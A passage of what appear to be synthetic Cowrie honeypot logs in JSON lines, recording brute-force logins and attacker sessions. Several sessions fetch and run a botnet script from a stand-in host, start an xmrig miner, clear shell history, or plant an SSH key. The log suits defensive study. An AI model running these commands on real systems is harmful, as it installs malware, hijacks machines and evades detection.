+{"timestamp": "2026-11-01T21:31:50.000000Z", "src_ip": "198.51.100.10", "session": "1332e641", "sensor": "ssh-in", "eventid": "cowrie.session.file_download", "url": "http://dl.botnet-sample.invalid/x86.sh", "shasum": "5f1c3f0a0b9d6e2c4a8b7e6d5c4b3a291817161514131211100f0e0d0c0b0a09", "outfile": "var/lib/cowrie/downloads/x"}
+{"timestamp": "2026-11-01T21:32:38.000000Z", "src_ip": "198.51.100.10", "session": "1332e641", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 29.2}
+{"timestamp": "2026-11-01T23:29:00.000000Z", "src_ip": "198.51.100.11", "session": "76b5d3b4", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 36683, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-01T23:29:00.000000Z", "src_ip": "198.51.100.11", "session": "76b5d3b4", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-01T23:29:00.000000Z", "src_ip": "198.51.100.11", "session": "76b5d3b4", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-01T23:29:03.000000Z", "src_ip": "198.51.100.11", "session": "76b5d3b4", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "ubuntu"}
+{"timestamp": "2026-11-01T23:29:07.000000Z", "src_ip": "198.51.100.11", "session": "76b5d3b4", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "123456"}
+{"timestamp": "2026-11-01T23:29:10.000000Z", "src_ip": "198.51.100.11", "session": "76b5d3b4", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "user", "password": "password"}
+{"timestamp": "2026-11-01T23:29:25.000000Z", "src_ip": "198.51.100.11", "session": "76b5d3b4", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cd /tmp; wget http://dl.botnet-sample.invalid/x86.sh; chmod +x x86.sh; ./x86.sh"}
+{"timestamp": "2026-11-01T23:29:25.000000Z", "src_ip": "198.51.100.11", "session": "76b5d3b4", "sensor": "ssh-in", "eventid": "cowrie.session.file_download", "url": "http://dl.botnet-sample.invalid/x86.sh", "shasum": "5f1c3f0a0b9d6e2c4a8b7e6d5c4b3a291817161514131211100f0e0d0c0b0a09", "outfile": "var/lib/cowrie/downloads/x"}
+{"timestamp": "2026-11-01T23:29:44.000000Z", "src_ip": "198.51.100.11", "session": "76b5d3b4", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-01T23:31:03.000000Z", "src_ip": "198.51.100.11", "session": "76b5d3b4", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 110.6}
+{"timestamp": "2026-11-02T03:33:00.000000Z", "src_ip": "203.0.113.136", "session": "fc0986a1", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 54070, "dst_ip": "192.0.2.20", "dst_port": 23, "protocol": "telnet"}
+{"timestamp": "2026-11-02T03:33:02.000000Z", "src_ip": "203.0.113.136", "session": "fc0986a1", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "test", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-02T03:33:14.000000Z", "src_ip": "203.0.113.136", "session": "fc0986a1", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-02T03:33:24.000000Z", "src_ip": "203.0.113.136", "session": "fc0986a1", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "curl -s ipinfo.io"}
+{"timestamp": "2026-11-02T03:33:37.000000Z", "src_ip": "203.0.113.136", "session": "fc0986a1", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "ls -la /"}
+{"timestamp": "2026-11-02T03:34:48.000000Z", "src_ip": "203.0.113.136", "session": "fc0986a1", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 97.4}
+{"timestamp": "2026-11-02T05:43:00.000000Z", "src_ip": "198.51.100.26", "session": "873ec0fe", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 38232, "dst_ip": "192.0.2.20", "dst_port": 23, "protocol": "telnet"}
+{"timestamp": "2026-11-02T05:43:02.000000Z", "src_ip": "198.51.100.26", "session": "873ec0fe", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "12345678"}
+{"timestamp": "2026-11-02T05:43:04.000000Z", "src_ip": "198.51.100.26", "session": "873ec0fe", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "ubuntu"}
+{"timestamp": "2026-11-02T05:43:08.000000Z", "src_ip": "198.51.100.26", "session": "873ec0fe", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "ubuntu", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-02T05:43:15.000000Z", "src_ip": "198.51.100.26", "session": "873ec0fe", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cat /proc/cpuinfo | grep name | wc -l"}
+{"timestamp": "2026-11-02T05:44:53.000000Z", "src_ip": "198.51.100.26", "session": "873ec0fe", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 71.1}
+{"timestamp": "2026-11-02T09:20:00.000000Z", "src_ip": "198.51.100.12", "session": "a8518ab6", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 51499, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-02T09:20:00.000000Z", "src_ip": "198.51.100.12", "session": "a8518ab6", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-02T09:20:00.000000Z", "src_ip": "198.51.100.12", "session": "a8518ab6", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-02T09:20:04.000000Z", "src_ip": "198.51.100.12", "session": "a8518ab6", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "123456"}
+{"timestamp": "2026-11-02T09:20:08.000000Z", "src_ip": "198.51.100.12", "session": "a8518ab6", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "root"}
+{"timestamp": "2026-11-02T09:20:11.000000Z", "src_ip": "198.51.100.12", "session": "a8518ab6", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-02T09:20:12.000000Z", "src_ip": "198.51.100.12", "session": "a8518ab6", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "admin"}
+{"timestamp": "2026-11-02T09:20:14.000000Z", "src_ip": "198.51.100.12", "session": "a8518ab6", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "support", "password": "12345678"}
+{"timestamp": "2026-11-02T09:20:26.000000Z", "src_ip": "198.51.100.12", "session": "a8518ab6", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "uname -a"}
+{"timestamp": "2026-11-02T09:20:55.000000Z", "src_ip": "198.51.100.12", "session": "a8518ab6", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 113.4}
+{"timestamp": "2026-11-02T19:09:00.000000Z", "src_ip": "198.51.100.10", "session": "c84dfdc7", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 40222, "dst_ip": "192.0.2.20", "dst_port": 23, "protocol": "telnet"}
+{"timestamp": "2026-11-02T19:09:02.000000Z", "src_ip": "198.51.100.10", "session": "c84dfdc7", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "admin"}
+{"timestamp": "2026-11-02T19:09:03.000000Z", "src_ip": "198.51.100.10", "session": "c84dfdc7", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "user", "password": "12345678"}
+{"timestamp": "2026-11-02T19:09:08.000000Z", "src_ip": "198.51.100.10", "session": "c84dfdc7", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "support", "password": "root"}
+{"timestamp": "2026-11-02T19:09:20.000000Z", "src_ip": "198.51.100.10", "session": "c84dfdc7", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "uname -a"}
+{"timestamp": "2026-11-02T19:09:32.000000Z", "src_ip": "198.51.100.10", "session": "c84dfdc7", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "curl -s ipinfo.io"}
+{"timestamp": "2026-11-02T19:09:50.000000Z", "src_ip": "198.51.100.10", "session": "c84dfdc7", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "whoami"}
+{"timestamp": "2026-11-02T19:11:27.000000Z", "src_ip": "198.51.100.10", "session": "c84dfdc7", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 22.8}
+{"timestamp": "2026-11-02T20:17:00.000000Z", "src_ip": "198.51.100.34", "session": "641462a5", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 30296, "dst_ip": "192.0.2.20", "dst_port": 23, "protocol": "telnet"}
+{"timestamp": "2026-11-02T20:17:02.000000Z", "src_ip": "198.51.100.34", "session": "641462a5", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "root"}
+{"timestamp": "2026-11-02T20:18:50.000000Z", "src_ip": "198.51.100.34", "session": "641462a5", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 79.5}
+{"timestamp": "2026-11-02T20:41:00.000000Z", "src_ip": "198.51.100.11", "session": "2367a4b1", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 50865, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-02T20:41:00.000000Z", "src_ip": "198.51.100.11", "session": "2367a4b1", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-02T20:41:00.000000Z", "src_ip": "198.51.100.11", "session": "2367a4b1", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-02T20:41:04.000000Z", "src_ip": "198.51.100.11", "session": "2367a4b1", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "git", "password": "root"}
+{"timestamp": "2026-11-02T20:41:56.000000Z", "src_ip": "198.51.100.11", "session": "2367a4b1", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 2.3}
+{"timestamp": "2026-11-02T20:45:00.000000Z", "src_ip": "198.51.100.57", "session": "5c0412d2", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 51716, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-02T20:45:00.000000Z", "src_ip": "198.51.100.57", "session": "5c0412d2", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-02T20:45:00.000000Z", "src_ip": "198.51.100.57", "session": "5c0412d2", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-02T20:45:04.000000Z", "src_ip": "198.51.100.57", "session": "5c0412d2", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "admin"}
+{"timestamp": "2026-11-02T20:45:22.000000Z", "src_ip": "198.51.100.57", "session": "5c0412d2", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 105.7}
+{"timestamp": "2026-11-02T22:57:00.000000Z", "src_ip": "198.51.100.16", "session": "55485980", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 44733, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-02T22:57:00.000000Z", "src_ip": "198.51.100.16", "session": "55485980", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-02T22:57:00.000000Z", "src_ip": "198.51.100.16", "session": "55485980", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-02T22:57:03.000000Z", "src_ip": "198.51.100.16", "session": "55485980", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "password"}
+{"timestamp": "2026-11-02T22:57:06.000000Z", "src_ip": "198.51.100.16", "session": "55485980", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "ubuntu"}
+{"timestamp": "2026-11-02T22:57:11.000000Z", "src_ip": "198.51.100.16", "session": "55485980", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "admin"}
+{"timestamp": "2026-11-02T22:57:15.000000Z", "src_ip": "198.51.100.16", "session": "55485980", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "root", "password": "123456"}
+{"timestamp": "2026-11-02T22:57:20.000000Z", "src_ip": "198.51.100.16", "session": "55485980", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "crontab -l"}
+{"timestamp": "2026-11-02T22:58:18.000000Z", "src_ip": "198.51.100.16", "session": "55485980", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 70.2}
+{"timestamp": "2026-11-03T00:23:00.000000Z", "src_ip": "198.51.100.15", "session": "03e49d26", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 38814, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-03T00:23:00.000000Z", "src_ip": "198.51.100.15", "session": "03e49d26", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-03T00:23:00.000000Z", "src_ip": "198.51.100.15", "session": "03e49d26", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-03T00:23:05.000000Z", "src_ip": "198.51.100.15", "session": "03e49d26", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-03T00:23:08.000000Z", "src_ip": "198.51.100.15", "session": "03e49d26", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "123456"}
+{"timestamp": "2026-11-03T00:23:09.000000Z", "src_ip": "198.51.100.15", "session": "03e49d26", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "git", "password": "ubuntu"}
+{"timestamp": "2026-11-03T00:23:12.000000Z", "src_ip": "198.51.100.15", "session": "03e49d26", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "user", "password": "12345678"}
+{"timestamp": "2026-11-03T00:23:57.000000Z", "src_ip": "198.51.100.15", "session": "03e49d26", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 65.7}
+{"timestamp": "2026-11-03T01:55:00.000000Z", "src_ip": "203.0.113.125", "session": "02c18c37", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 43499, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-03T01:55:00.000000Z", "src_ip": "203.0.113.125", "session": "02c18c37", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-03T01:55:00.000000Z", "src_ip": "203.0.113.125", "session": "02c18c37", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-03T01:55:02.000000Z", "src_ip": "203.0.113.125", "session": "02c18c37", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "ubuntu"}
+{"timestamp": "2026-11-03T01:55:04.000000Z", "src_ip": "203.0.113.125", "session": "02c18c37", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "admin"}
+{"timestamp": "2026-11-03T01:55:37.000000Z", "src_ip": "203.0.113.125", "session": "02c18c37", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 83.0}
+{"timestamp": "2026-11-03T04:19:00.000000Z", "src_ip": "198.51.100.14", "session": "fa49d313", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 42201, "dst_ip": "192.0.2.20", "dst_port": 23, "protocol": "telnet"}
+{"timestamp": "2026-11-03T04:19:02.000000Z", "src_ip": "198.51.100.14", "session": "fa49d313", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "oracle", "password": "password"}
+{"timestamp": "2026-11-03T04:19:18.000000Z", "src_ip": "198.51.100.14", "session": "fa49d313", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "crontab -l"}
+{"timestamp": "2026-11-03T04:19:19.000000Z", "src_ip": "198.51.100.14", "session": "fa49d313", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "nohup ./xmrig -o stratum+tcp://pool.miner-sample.invalid:3333 --donate-level 1 &"}
+{"timestamp": "2026-11-03T04:19:23.000000Z", "src_ip": "198.51.100.14", "session": "fa49d313", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "pkill -9 xmrig"}
+{"timestamp": "2026-11-03T04:19:42.000000Z", "src_ip": "198.51.100.14", "session": "fa49d313", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "ls -la /"}
+{"timestamp": "2026-11-03T04:20:59.000000Z", "src_ip": "198.51.100.14", "session": "fa49d313", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 56.6}
+{"timestamp": "2026-11-03T06:10:00.000000Z", "src_ip": "198.51.100.40", "session": "a9d6587c", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 32844, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-03T06:10:00.000000Z", "src_ip": "198.51.100.40", "session": "a9d6587c", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-03T06:10:00.000000Z", "src_ip": "198.51.100.40", "session": "a9d6587c", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-03T06:10:04.000000Z", "src_ip": "198.51.100.40", "session": "a9d6587c", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "qwerty"}
+{"timestamp": "2026-11-03T06:11:05.000000Z", "src_ip": "198.51.100.40", "session": "a9d6587c", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 66.8}
+{"timestamp": "2026-11-03T06:26:00.000000Z", "src_ip": "203.0.113.124", "session": "f07f3fc4", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 43172, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-03T06:26:00.000000Z", "src_ip": "203.0.113.124", "session": "f07f3fc4", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-03T06:26:00.000000Z", "src_ip": "203.0.113.124", "session": "f07f3fc4", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-03T06:26:03.000000Z", "src_ip": "203.0.113.124", "session": "f07f3fc4", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "git", "password": "root"}
+{"timestamp": "2026-11-03T06:26:23.000000Z", "src_ip": "203.0.113.124", "session": "f07f3fc4", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "pkill -9 xmrig"}
+{"timestamp": "2026-11-03T06:26:30.000000Z", "src_ip": "203.0.113.124", "session": "f07f3fc4", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-03T06:26:37.000000Z", "src_ip": "203.0.113.124", "session": "f07f3fc4", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cd /tmp; wget http://dl.botnet-sample.invalid/x86.sh; chmod +x x86.sh; ./x86.sh"}
+{"timestamp": "2026-11-03T06:26:37.000000Z", "src_ip": "203.0.113.124", "session": "f07f3fc4", "sensor": "ssh-in", "eventid": "cowrie.session.file_download", "url": "http://dl.botnet-sample.invalid/x86.sh", "shasum": "5f1c3f0a0b9d6e2c4a8b7e6d5c4b3a291817161514131211100f0e0d0c0b0a09", "outfile": "var/lib/cowrie/downloads/x"}
+{"timestamp": "2026-11-03T06:28:28.000000Z", "src_ip": "203.0.113.124", "session": "f07f3fc4", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 57.5}
+{"timestamp": "2026-11-03T08:04:00.000000Z", "src_ip": "198.51.100.27", "session": "01d9fd05", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 43270, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-03T08:04:00.000000Z", "src_ip": "198.51.100.27", "session": "01d9fd05", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-03T08:04:00.000000Z", "src_ip": "198.51.100.27", "session": "01d9fd05", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-03T08:04:02.000000Z", "src_ip": "198.51.100.27", "session": "01d9fd05", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "support", "password": "password"}
+{"timestamp": "2026-11-03T08:04:13.000000Z", "src_ip": "198.51.100.27", "session": "01d9fd05", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "curl -s ipinfo.io"}
+{"timestamp": "2026-11-03T08:04:16.000000Z", "src_ip": "198.51.100.27", "session": "01d9fd05", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "free -m"}
+{"timestamp": "2026-11-03T08:04:23.000000Z", "src_ip": "198.51.100.27", "session": "01d9fd05", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "pkill -9 xmrig"}
+{"timestamp": "2026-11-03T08:05:42.000000Z", "src_ip": "198.51.100.27", "session": "01d9fd05", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 111.1}
+{"timestamp": "2026-11-03T09:00:00.000000Z", "src_ip": "203.0.113.108", "session": "1f4575b3", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 52011, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-03T09:00:00.000000Z", "src_ip": "203.0.113.108", "session": "1f4575b3", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-03T09:00:00.000000Z", "src_ip": "203.0.113.108", "session": "1f4575b3", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-03T09:00:05.000000Z", "src_ip": "203.0.113.108", "session": "1f4575b3", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "qwerty"}
+{"timestamp": "2026-11-03T09:00:06.000000Z", "src_ip": "203.0.113.108", "session": "1f4575b3", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "pi", "password": "password"}
+{"timestamp": "2026-11-03T09:00:11.000000Z", "src_ip": "203.0.113.108", "session": "1f4575b3", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "curl -s ipinfo.io"}
+{"timestamp": "2026-11-03T09:00:27.000000Z", "src_ip": "203.0.113.108", "session": "1f4575b3", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "nohup ./xmrig -o stratum+tcp://pool.miner-sample.invalid:3333 --donate-level 1 &"}
+{"timestamp": "2026-11-03T09:00:47.000000Z", "src_ip": "203.0.113.108", "session": "1f4575b3", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "ls -la /"}
+{"timestamp": "2026-11-03T09:02:05.000000Z", "src_ip": "203.0.113.108", "session": "1f4575b3", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 117.5}
+{"timestamp": "2026-11-03T09:57:00.000000Z", "src_ip": "198.51.100.13", "session": "5250f595", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 58433, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-03T09:57:00.000000Z", "src_ip": "198.51.100.13", "session": "5250f595", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-03T09:57:00.000000Z", "src_ip": "198.51.100.13", "session": "5250f595", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-03T09:57:04.000000Z", "src_ip": "198.51.100.13", "session": "5250f595", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "support", "password": "qwerty"}
+{"timestamp": "2026-11-03T09:57:20.000000Z", "src_ip": "198.51.100.13", "session": "5250f595", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "uname -a"}
+{"timestamp": "2026-11-03T09:57:40.000000Z", "src_ip": "198.51.100.13", "session": "5250f595", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cat /proc/cpuinfo | grep name | wc -l"}
+{"timestamp": "2026-11-03T09:57:53.000000Z", "src_ip": "198.51.100.13", "session": "5250f595", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "free -m"}
+{"timestamp": "2026-11-03T09:58:02.000000Z", "src_ip": "198.51.100.13", "session": "5250f595", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "echo 'ssh-rsa AAAAB3NzaC1 sample@key' >> ~/.ssh/authorized_keys"}
+{"timestamp": "2026-11-03T09:59:06.000000Z", "src_ip": "198.51.100.13", "session": "5250f595", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 105.1}
+{"timestamp": "2026-11-03T10:56:00.000000Z", "src_ip": "198.51.100.15", "session": "90185a17", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 58515, "dst_ip": "192.0.2.20", "dst_port": 23, "protocol": "telnet"}
+{"timestamp": "2026-11-03T10:56:01.000000Z", "src_ip": "198.51.100.15", "session": "90185a17", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-03T10:56:03.000000Z", "src_ip": "198.51.100.15", "session": "90185a17", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "admin"}
+{"timestamp": "2026-11-03T10:56:06.000000Z", "src_ip": "198.51.100.15", "session": "90185a17", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "pi", "password": "password"}
+{"timestamp": "2026-11-03T10:56:09.000000Z", "src_ip": "198.51.100.15", "session": "90185a17", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-03T10:56:24.000000Z", "src_ip": "198.51.100.15", "session": "90185a17", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "nohup ./xmrig -o stratum+tcp://pool.miner-sample.invalid:3333 --donate-level 1 &"}
+{"timestamp": "2026-11-03T10:56:35.000000Z", "src_ip": "198.51.100.15", "session": "90185a17", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "whoami"}
+{"timestamp": "2026-11-03T10:56:52.000000Z", "src_ip": "198.51.100.15", "session": "90185a17", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 26.2}
+{"timestamp": "2026-11-03T16:35:00.000000Z", "src_ip": "198.51.100.42", "session": "697b88c2", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 47165, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-03T16:35:00.000000Z", "src_ip": "198.51.100.42", "session": "697b88c2", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-03T16:35:00.000000Z", "src_ip": "198.51.100.42", "session": "697b88c2", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-03T16:35:05.000000Z", "src_ip": "198.51.100.42", "session": "697b88c2", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "git", "password": "root"}
+{"timestamp": "2026-11-03T16:36:52.000000Z", "src_ip": "198.51.100.42", "session": "697b88c2", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 110.6}
+{"timestamp": "2026-11-03T21:02:00.000000Z", "src_ip": "198.51.100.58", "session": "048c5c58", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 36581, "dst_ip": "192.0.2.20", "dst_port": 23, "protocol": "telnet"}
+{"timestamp": "2026-11-03T21:02:05.000000Z", "src_ip": "198.51.100.58", "session": "048c5c58", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "123456"}
+{"timestamp": "2026-11-03T21:02:49.000000Z", "src_ip": "198.51.100.58", "session": "048c5c58", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 86.7}
+{"timestamp": "2026-11-03T21:48:00.000000Z", "src_ip": "198.51.100.51", "session": "3de8acfe", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 57333, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
